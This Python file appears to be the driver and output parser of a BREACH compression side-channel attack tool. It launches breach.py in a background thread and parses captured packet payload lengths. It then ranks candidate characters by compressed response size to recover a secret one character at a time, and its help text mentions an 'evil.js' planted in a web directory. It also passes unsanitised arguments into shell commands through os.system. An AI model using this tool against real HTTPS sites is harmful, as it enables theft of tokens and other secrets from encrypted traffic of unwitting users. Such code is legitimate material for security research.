from __future__ import division
from os import system, path, getpid
import datetime
import logging
import time
import argparse
import breach
import signal
from sys import exit
import breach
import threading

def signal_handler(signal, frame):
    '''
    Signal handler for killing the execution.
    '''
    print('Exiting the program per your command')
    system('rm -f out.out request.txt hillclimbing.pyc constants.pyc breach.pyc')
    system('mv basic_breach.log full_breach.log debug.log attack.log ' + args_dict['history_folder'])
    exit(0)
signal.signal(signal.SIGINT, signal_handler)

def setup_logger(logger_name, log_file, level=logging.DEBUG):
    '''
    Logger factory.
    '''
    l = logging.getLogger(logger_name)
    formatter = logging.Formatter('%(asctime)s : %(message)s')
    fileHandler = logging.FileHandler(log_file)
    fileHandler.setFormatter(formatter)
    streamHandler = logging.StreamHandler()
    streamHandler.setFormatter(formatter)
    l.setLevel(level)
    l.addHandler(fileHandler)
    l.addHandler(streamHandler)
    return

def initialize():
    '''
    Initialize global constants.
    '''
    global point_system_serial, point_system_parallel
    point_system_serial = {1: 20, 2: 16, 3: 12, 4: 10, 5: 8, 6: 6, 7: 4, 8: 3, 9: 2, 10: 1}
    point_system_parallel = {0: 1}

def get_alphabet(request_args):
    '''
    Get the alphabet of the search strings.
    '''
    import hillclimbing

    return hillclimbing.create_request_file(request_args)

def init_temp_objects(alphabet):
    '''
    Initialize temporary dicts and lists.
    '''
    iterations = {}
    output_sum = {}
    for i in alphabet:
        iterations[i] = 0
        output_sum[i] = 0
    return iterations, output_sum

def create_dictionary_sample(output_dict, iter_dict):
    '''
    Create a dictionary of the sampled input.
    '''
    combined = {}
    for k, v in iter_dict.items():
        if v != 0:
            combined[k] = output_dict[k] / iter_dict[k]
    return combined

def sort_dictionary_values(in_dict, desc = False):
    '''
    Sort a dictionary by values.
    '''
    sorted_dict = [ (v,k) for k, v in in_dict.items() ]
    sorted_dict.sort(reverse=desc)
    return sorted_dict

def sort_dictionary(in_dict, desc = False):
    '''
    Sort a dictionary by keys.
    '''
    sorted_dict = [ (v,k) for v, k in in_dict.items() ]
    sorted_dict.sort(reverse=desc)
    return sorted_dict

def continue_parallel_division(args_dict, correct_alphabet):
    '''
    Continue parallel execution with the correct half of the previous alphabet.
    '''
    return get_alphabet({'alphabet': correct_alphabet, 'prefix': args_dict['prefix'], 'method': args_dict['method']})

def parse_input(args_dict):
    system('sudo rm ' + args_dict['wdir'] + '/request.txt')
    time.sleep(5)
    system('rm -f out.out')
    if not args_dict['divide_and_conquer']:
        args_dict['alphabet'] = get_alphabet({'alpha_types': args_dict['alpha_types'], 'prefix': args_dict['prefix'], 'method': args_dict['method']})
    system('cp request.txt ' + args_dict['wdir'])

    if args_dict['execute_breach'] and ('breach_thread' not in args_dict or not args_dict['breach_thread'].isAlive()):
        args_dict['debug_logger'].debug('breach_thread in args_dict? %s\n' % str('breach_thread' in args_dict))
        if 'breach_thread' in args_dict:
            args_dict['debug_logger'].debug('breach_thread is alive? %s\n' % str(args_dict['breach_thread'].isAlive()))
        breach_thread = BreachThread(args_dict)
        breach_thread.start()
        args_dict['breach_thread'] = breach_thread

    alpha_types = args_dict['alpha_types']
    alphabet = args_dict['alphabet']
    pivot_length = args_dict['pivot_length']
    prefix = args_dict['prefix']
    latest_file = args_dict['latest_file']
    minimum_request_length = args_dict['minimum_request_length']
    method = args_dict['method']
    correct_val = args_dict['correct_val']
    sampling_ratio = args_dict['sampling_ratio']
    refresh_time = args_dict['refresh_time']

    filename = '_'.join(alpha_types) + '_' + prefix + '_' + str(args_dict['divide_and_conquer'])
    system('mkdir ' + args_dict['history_folder'] + filename)
    system('cp request.txt ' + args_dict['history_folder'] + filename + '/request_' + filename)

    if method == 'p' and correct_val:
        if correct_val in alphabet[0]:
            correct_val = alphabet[0]
        elif correct_val in alphabet[1]:
            correct_val = alphabet[1]
        else:
            correct_val = None
    point_system = point_system_parallel if method == 'p' else point_system_serial
    checkpoint = args_dict['iterations']
    continue_parallel = False

    while path.isfile(args_dict['history_folder'] + filename + '/out_' + filename + '_' + str(args_dict['latest_file'])):
        args_dict['latest_file'] = args_dict['latest_file'] + 1

    args_dict['debug_logger'].debug('Starting loop with args_dict: %s\n' % str(args_dict))
    while args_dict['breach_thread'].isAlive() if args_dict['execute_breach'] else True:
        iterations, output_sum = init_temp_objects(alphabet)
        samples = {}
        points = {}
        for key, value in iterations.items():
            points[key] = 0

        result_file = open(args_dict['history_folder'] + filename + '/result_' + filename, 'w')
        if correct_val:
            result_file.write('Correct value = %s\n\n' % correct_val)
        result_file.write('Combined output files\n\n')
        system('cp out.out ' + args_dict['history_folder'] + filename + '/out_' + filename + '_' + str(args_dict['latest_file']))
        out_iterator = '0'
        total_requests = 0
        with open('.parsed_output.log', 'w') as f:
            while int(out_iterator) < 100:
                try:
                    output_file = open(args_dict['history_folder'] + filename + '/out_' + filename + '_' + out_iterator, 'r')
                    result_file.write('out_' + filename + '_' + out_iterator + '\n')

                    prev_request = 0
                    curr_request = 0
                    buff = []
                    request_buff = []
                    found_first_req = False
                    found_response_packet = False
                    grab_next = False
                    for line in output_file.readlines():
                        if prev_request % len(alphabet) == 0:
                            for r in buff:
                                f.write(r)
                                total_requests = total_requests + 1
                            buff = []
                        if line.find(':') < 0:
                            continue
                        pref, size = line.split(': ')
                        if minimum_request_length:
                            if pref == 'User application payload' and int(size) > minimum_request_length:
                                if not found_first_req:
                                    found_first_req = True
                                    request_buff = []
                                    continue
                                for packet in request_buff:
                                    pref, size = packet.split(': ')
                                    if (pref == 'Endpoint application payload'):
                                        if grab_next:
                                            grab_next = False
                                            summary = int(size)
                                            buff.append('%d: %d\n' % (prev_request, summary))
                                            prev_request = prev_request + 1
                                            found_response_packet = True
                                        if int(size) > pivot_length - 15 and int(size) < pivot_length + 15:
                                            grab_next = True
                                if found_response_packet:
                                    found_response_packet = False
                                else:
                                    buff.append('%d: -1\n' % prev_request)
                                    prev_request = prev_request + 1
                                request_buff = []
                            else:
                                request_buff.append(line.strip())
                        else:
                            if (pref == 'Endpoint application payload'):
                                if grab_next:
                                    grab_next = False
                                    summary = int(size) + prev_size
                                    buff.append('%d: %d\n' % (prev_request, summary))
                                    prev_request = prev_request + 1
                                if int(size) > pivot_length - 10 and int(size) < pivot_length + 10:
                                    grab_next = True
                                    continue
                                prev_size = int(size)

                    output_file.close()
                    out_iterator = str(int(out_iterator) + 1)
                    f.write('-1: -2\n')
                except Exception as e:
                    break

        total_requests = total_requests / len(alphabet)
        with open('.parsed_output.log', 'r') as f:
            alpha_counter = 0
            for parsed_line in f.readlines():
                it, sz = parsed_line.split(': ')
                if int(sz) == -2:
                    alpha_counter = 0
                    continue
                if int(sz) > 0:
                    output_sum[alphabet[alpha_counter]] = output_sum[alphabet[alpha_counter]] + int(sz)
                    iterations[alphabet[alpha_counter]] = iterations[alphabet[alpha_counter]] + 1
                alpha_counter = alpha_counter + 1
                if alpha_counter > len(alphabet) - 1:
                    alpha_counter = 0
                    sample = create_dictionary_sample(output_sum, iterations)
                    sorted_sample = sort_dictionary_values(sample)
                    samples[iterations[alphabet[alpha_counter]]] = sorted_sample
        result_file.write('\n')
        result_file.write('Combined sorted results\n')

        combined = create_dictionary_sample(output_sum, iterations)
        combined_sorted = sort_dictionary_values(combined)
        samples[iterations[alphabet[0]]] = combined_sorted
        samples = sort_dictionary(samples)
        if correct_val:
            result_file.write('\n')
            found_in_iter = False
            correct_leader = False
            result_file.write('\n')
            result_file.write('Iteration - Length Chart - Divergence from top - Points Chart - Points\n\n')
            for sample in samples:
                pos = 1
                for j in sample[1]:
                    if correct_leader:
                        divergence = j[0] - correct_len
                        correct_leader = False
                    if j[1] == correct_val:
                        correct_pos = pos
                        correct_len = j[0]
                        if pos == 1:
                            correct_leader = True
                        else:
                            divergence = leader_len - j[0]
                        found_in_iter = True
                    else:
                        if pos == 1:
                            leader_len = j[0]
                    if pos in point_system and sample[0]:
                        if iterations[alphabet[0]] > args_dict['iterations']/2:
                            points[j[1]] = points[j[1]] + 2 * point_system[pos]
                        else:
                            points[j[1]] = points[j[1]] + point_system[pos]
                    pos = pos + 1
                if sample[0] % sampling_ratio == 0 or sample[0] > len(samples) - 10:
                    if not found_in_iter:
                        result_file.write('%d\t%d\t%d\t%d\t%d\n' % (0, 0, 0, 0, 0))
                    else:
                        points_chart = sort_dictionary_values(points, True)
                        for position in enumerate(points_chart):
                            if position[1][1] == correct_val:
                                correct_position_chart = position[0] + 1
                                if position[0] == 0:
                                    diff = position[1][0] - points_chart[1][0]
                                else:
                                    diff = position[1][0] - points_chart[0][0]
                        result_file.write('%d\t\t%d\t\t%f\t\t%d\t%d\n' % (sample[0], correct_pos, divergence, correct_position_chart, diff))
            result_file.write('\n')
        else:
            for sample in enumerate(samples):
                for j in enumerate(sample[1][1]):
                    if j[0] in point_system and sample[1][0]:
                        if sample[0] > args_dict['iterations']/2:
                            points[j[1][1]] = points[j[1][1]] + (2 * point_system[j[0]])
                        else:
                            points[j[1][1]] = points[j[1][1]] + point_system[j[0]]
            result_file.write('\n')
            result_file.write('Iteration %d\n\n' % iterations[alphabet[0]])
            if method == 's' and combined_sorted:
                result_file.write('Correct Value is \'%s\' with divergence %f from second best.\n' % (combined_sorted[0][1], combined_sorted[1][0] - combined_sorted[0][0]))
        if method == 's':
            points = sort_dictionary_values(points, True)
            for symbol in enumerate(combined_sorted):
                if symbol[0] % 6 == 0:
                    result_file.write('\n')
                result_file.write('%s %f\t' % (symbol[1][1], symbol[1][0]))
            result_file.write('\n')
            for symbol in enumerate(points):
                if symbol[0] % 10 == 0:
                    result_file.write('\n')
                result_file.write('%s %d\t' % (symbol[1][1], symbol[1][0]))
        elif method == 'p':
            for symbol in enumerate(combined_sorted):
                if symbol[0] == 0: # TODO: Better calculation of correct alphabet
                    correct_alphabet = symbol[1][1].split(prefix)
                    correct_alphabet.pop(0)
                    for i in enumerate(correct_alphabet):
                        correct_alphabet[i[0]] = i[1].split()[0]
                result_file.write('%s \nLength: %f\nPoints: %d\n\n' % (symbol[1][1], symbol[1][0], points[symbol[1][1]]))
        result_file.write('\n')
        result_file.close()
        system('rm .parsed_output.log')
        system('cat ' + args_dict['history_folder'] + filename + '/result_' + filename)
        points = sort_dictionary_values(points, True)
        if method == 'p' and points[0][0] > checkpoint/2:
            '''
            if checkpoint == 2*args_dict['iterations']/3 and (points[0][0] - points[1][0] > args_dict['iterations']/4 or combined_sorted[1][0] - combined_sorted[0][0] > 5):
                print('Restarting due to biased run')
                parse_input(args_dict)
                break
            if points[0][0] - points[1][0] < args_dict['iterations']/20:
                checkpoint = checkpoint + args_dict['iterations']/3
                print('Not enough data for safe conclusion yet. Next checkpoint: %d' % checkpoint)
                continue
            '''
            if len(correct_alphabet) == 1:
                args_dict['prefix'] = args_dict['prefix'] + correct_alphabet[0]
                args_dict['divide_and_conquer'] = 0
                args_dict['alphabet']= get_alphabet({'alpha_types': args_dict['alpha_types'], 'prefix': args_dict['prefix'], 'method': args_dict['method']})
                args_dict['attack_logger'].debug('SUCCESS: %s\n' % correct_alphabet[0])
                args_dict['attack_logger'].debug('Total time till now: %s\n' % str(datetime.datetime.now() - args_dict['start_time']))
                args_dict['attack_logger'].debug('----------Continuing----------\n')
                args_dict['attack_logger'].debug('Alphabet: %s\n' % str(args_dict['alphabet']))
            else:
                args_dict['divide_and_conquer'] = args_dict['divide_and_conquer'] + 1
                correct_alphabet = points[0][1].split(prefix)
                correct_alphabet.pop(0)
                for i in enumerate(correct_alphabet):
                    correct_alphabet[i[0]] = i[1].split()[0]
                args_dict['alphabet'] = continue_parallel_division(args_dict, correct_alphabet)
                continue_parallel = True
                args_dict['attack_logger'].debug('Alphabet: %s\n' % str(args_dict['alphabet']))
            args_dict['latest_file'] = 0
            break
        time.sleep(refresh_time)
    if args_dict['execute_breach']:
        if not continue_parallel:
            args_dict['breach_thread'].join()
            args_dict['latest_file'] = args_dict['latest_file'] + 1
    return args_dict

def parse_args():
    '''
    Parse command line arguments.
    '''
    parser = argparse.ArgumentParser(description='Parser of breach.py output')
    parser.add_argument('-a', '--alpha_types', metavar = 'alphabet', required = True, nargs = '+', help = 'Choose alphabet types: n => digits, l => lowercase letters, u => uppercase letters, d => - and _')
    parser.add_argument('-l', '--len_pivot', metavar = 'pivot_length', required = True, type = int, help = 'Input the (observed payload) length value of the pivot packet')
    parser.add_argument('-p', '--prefix', metavar = 'bootstrap_prefix', required = True, help = 'Input the already known prefix needed for bootstrap')
    parser.add_argument('-m', '--method', metavar = 'request_method', help = 'Choose the request method: s => serial, p => parallel')
    parser.add_argument('-lf', '--latest_file', metavar = 'latest_file_number', type = int, help = 'Input the latest output file breach.py has created, -1 if first try')
    parser.add_argument('-r', '--request_len', metavar = 'minimum_request_length', type = int, help = 'Input the minimum length of the request packet')
    parser.add_argument('-c', '--correct', metavar = 'correct_value', help = 'Input the correct value we attack')
    parser.add_argument('-s', '--sample', metavar = 'sample', type = int, help = 'Input the sampling ratio')
    parser.add_argument('-i', '--iterations', metavar = 'number_of_iterations', type = int, help = 'Input the number of iterations per symbol.')
    parser.add_argument('-t', '--refresh_time', metavar = 'refresh_time', type = int, help = 'Input the refresh time in seconds')
    parser.add_argument('--wdir', metavar = 'web_application_directory', help = 'The directory where you have added evil.js')
    parser.add_argument('--execute_breach', action = 'store_true', help = 'Initiate breach attack via breach.py')
    parser.add_argument('--silent', action = 'store_true', help = 'Enable silent execution')
    parser.add_argument('--verbose', metavar = 'verbosity_level', type = int, help = 'Choose verbosity level: 0 => no logs, 1 => attack logs, 2 => debug logs, 3 => basic breach logs, 4 => full logs')
    args = parser.parse_args()

    args_dict = {}
    args_dict['alpha_types'] = args.alpha_types
    args_dict['prefix'] = args.prefix
    args_dict['method'] = args.method if args.method else 's'
    args_dict['pivot_length'] = args.len_pivot
    args_dict['minimum_request_length'] = args.request_len if args.request_len else None
    args_dict['correct_val'] = args.correct if args.correct else None
    args_dict['sampling_ratio'] = args.sample if args.sample else 200000000
    args_dict['iterations'] = args.iterations if args.iterations else 500
    args_dict['refresh_time'] = args.refresh_time if args.refresh_time else 60
    args_dict['wdir'] = args.wdir if args.wdir else '/var/www/breach'
    args_dict['execute_breach'] = True if args.execute_breach else False
    args_dict['silent'] = True if args.silent else False
    args_dict['verbose'] = args.verbose if args.verbose else 0
    return args_dict

class BreachThread(threading.Thread):
    '''
    Thread to run breach.py on the background.
    '''
    def __init__(self, args_dict):
        super(BreachThread, self).__init__()
        self.args_dict = args_dict
        self.daemon = True
        self.args_dict['debug_logger'].debug('Initialized breach thread\n')

    def run(self):
        self.breach_object = breach.Breach(self.args_dict)
        self.args_dict['debug_logger'].debug('Created breach object\n')
        self.breach_object.execute_breach()
        self.args_dict['debug_logger'].debug('Breach has stopped executing\n')
        return

if __name__ == '__main__':
    initialize()
    args_dict = parse_args()
    args_dict['history_folder'] = 'history/'
    args_dict['divide_and_conquer'] = 0
    args_dict['latest_file'] = 0
    system('mkdir ' + args_dict['history_folder'])
    args_dict['start_time'] = datetime.datetime.now()
    if args_dict['verbose'] < 1:
        setup_logger('attack_logger', 'attack.log', logging.ERROR)
    else:
        setup_logger('attack_logger', 'attack.log')
    if args_dict['verbose'] < 2:
        setup_logger('debug_logger', 'debug.log', logging.ERROR)
    else:
        setup_logger('debug_logger', 'debug.log')
    args_dict['debug_logger'] = logging.getLogger('debug_logger')
    args_dict['attack_logger'] = logging.getLogger('attack_logger')
    args_dict['attack_logger'].debug('Starting attack\n')
    while 1:
        args_dict = parse_input(args_dict)
